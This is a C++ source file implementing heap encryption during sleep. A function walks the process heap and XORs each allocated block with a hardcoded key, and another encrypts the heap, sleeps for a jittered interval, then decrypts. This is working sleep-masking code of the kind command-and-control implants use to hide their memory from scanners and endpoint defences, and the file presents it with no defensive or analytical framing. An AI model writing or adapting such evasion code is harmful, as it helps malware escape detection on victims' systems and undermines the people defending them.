#include "HeapEncrypt.h"
#include <cstdlib>
#include <ctime>

static const BYTE HEAP_XOR_KEY[] = {
    0xDE, 0xAD, 0xB4, 0xDB, 0x4B, 0x3F, 0xF0, 0x0D,
    0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0xC0, 0xDE
};

int HeapEncrypt::EncryptDecrypt(DWORD maxBlockSize) {
    HANDLE hHeap = GetProcessHeap();
    if (!hHeap) return 0;

    // Lock the heap to prevent concurrent allocations corrupting our walk
    if (!HeapLock(hHeap)) return 0;

    int count = 0;
    PROCESS_HEAP_ENTRY entry = {};
    while (HeapWalk(hHeap, &entry)) {
        // Only encrypt committed data blocks (not free blocks or region headers)
        if (!(entry.wFlags & PROCESS_HEAP_ENTRY_BUSY)) continue;
        if (entry.cbData == 0 || entry.cbData > maxBlockSize) continue;

        // Skip very small blocks (likely runtime internal metadata)
        if (entry.cbData < 16) continue;

        BYTE* p = (BYTE*)entry.lpData;
        for (SIZE_T i = 0; i < entry.cbData; i++)
            p[i] ^= HEAP_XOR_KEY[i % sizeof(HEAP_XOR_KEY)];
        count++;
    }

    HeapUnlock(hHeap);
    return count;
}

void HeapEncrypt::EncryptedSleep(DWORD ms, DWORD jitter) {
    if (jitter > 0) {
        static bool seeded = false;
        if (!seeded) { srand((unsigned)time(NULL)); seeded = true; }
        ms += (DWORD)(rand() % (jitter + 1));
    }

    EncryptDecrypt();   // encrypt
    Sleep(ms);
    EncryptDecrypt();   // decrypt (XOR is its own inverse)
}
